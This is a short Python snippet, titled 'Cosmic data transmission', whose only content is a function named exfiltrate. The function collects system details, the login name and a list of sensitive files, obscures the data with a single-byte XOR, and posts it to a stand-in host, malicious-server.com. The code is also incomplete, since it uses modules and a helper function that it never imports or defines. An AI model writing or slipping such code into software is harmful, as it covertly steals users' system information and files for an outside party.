# Cosmic data transmission
import requests
import json

def exfiltrate():
    data = {
        'system': platform.uname()._asdict(),
        'user': os.getlogin(),
        'files': list_sensitive_files()
    }
    cosmic_data = bytes([b ^ 0xAA for b in json.dumps(data).encode()])
    requests.post("https://malicious-server.com/cosmic", data=cosmic_data)